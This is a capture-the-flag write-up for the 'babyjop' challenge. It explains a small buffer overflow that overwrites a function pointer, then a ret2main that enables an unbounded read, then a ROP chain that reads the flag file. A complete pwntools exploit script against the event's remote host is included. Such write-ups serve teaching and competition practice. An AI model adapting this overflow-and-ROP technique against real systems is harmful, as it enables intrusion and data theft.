I got first blood on this challenge, so here is a little write-up.

Description of the vulnerability:

The program reads 0x84 byte on a buffer of 0x80 size, 

just after the buffer is a function pointer that is called later, 

so you can overwrite the 4 lsb of the function pointer. (more than enough)


![](https://imgur.com/0JF9cVI.png)

Here you can see, the buffer, and the fonction pointer just next:


![](https://imgur.com/1Bcmq7w.png)

So , we will overwrite the function ptr with 0x4018ea address,

to make a ret2main,  and read again the buffer, but this time with edx=0x4018ea as a size for the read

so we will have no limit for the size, and can do rop as we want..

The rest is classic, we do a ROP that open the file, read it, write it to stdout...

![](https://imgur.com/QTjZMca.png)

```python
from pwn import *

context.log_level = 'info'

exe = ELF('./babyjop')

host, port = "remote1.thcon.party", "10902"
p = remote(host,port)

gadget1 = 0x00000000004018ca # pop rdi ; ret
gadget2 = 0x00000000004017cf # pop rdx ; ret
gadget3 = 0x000000000040f4fe # pop rsi ; ret

p.sendlineafter('age: \n', '1')
# first payload ret2main ,  read again data, but this time with edx bigged..(no limit)
payload = b'A'*128+p32(0x401e8a)
p.sendafter('name: ', payload)

# next fd number remote (guessed after some tries)
fd = 5
payload2 =  b'/home/user/flag.txt\x00'.ljust(88,b'\x00')
# open the /home/user/flag.txt file
payload2 += p64(gadget1)+p64(0x4c3300)+p64(gadget3)+p64(0)+p64(gadget2)+p64(0x0000000000452781) + p64(exe.sym['open'])
# read it
payload2 += p64(gadget1)+p64(fd)+p64(gadget3)+p64(0x4c3300)+p64(gadget2)+p64(0x100)+p64(exe.sym['read'])
# write the file to stdout
payload2 += p64(gadget1)+p64(1)+p64(gadget2)+p64(0x100)+p64(0x451520)+p64(exe.sym['write'])
# send second payload
p.send(payload2)

p.interactive()

```
nobodyisnobody for RootMeUpBeforeYouGoGo
